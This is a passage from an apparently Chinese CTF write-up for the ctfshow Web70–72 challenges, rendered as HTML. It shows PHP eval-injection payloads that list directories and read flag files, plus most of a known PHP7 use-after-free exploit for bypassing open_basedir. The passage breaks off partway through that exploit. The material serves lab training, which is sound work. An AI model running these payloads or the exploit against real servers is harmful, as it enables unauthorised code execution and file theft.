&quot;</span>;&#125;</span><br><span class="line"><span class="comment"># 3 </span></span><br><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&quot; &quot;</span>);&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="Web71"><a href="#Web71" class="headerlink" title="Web71"></a>Web71</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure><p>ob_get_contents() 返回输出缓冲区的内容</p><p>ob_end_clean()  清空（擦除）缓冲区并关闭输出缓冲</p><p>代码执行的大概流程是 <code>传参--命令执行--执行结果存在$s中--清空输出缓冲区--对$s进行过滤</code></p><p>由于清空输出缓冲区 传入的命令也就无法执行 这里要做的就是把代码终止在清空输出缓冲区之前使用exit()</p><p>强制退出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># flag.txt 在根目录下</span></span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><h2 id="Web72"><a href="#Web72" class="headerlink" title="Web72"></a>Web72</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure><p>发现根目录下没有flag.txt了</p><p>存在open_basedir使用glob伪协议看下跟目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现flag发现在flag0.txt下</p><p>利用群主提供的uaf脚本绕过open_basedir进行命令执行</p><p>原始脚本:<a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 只需提交函数内容 记得url编码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="variable">$s</span> - <span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>, (<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>, (<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$s</span> != <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123;</span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>;</span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) 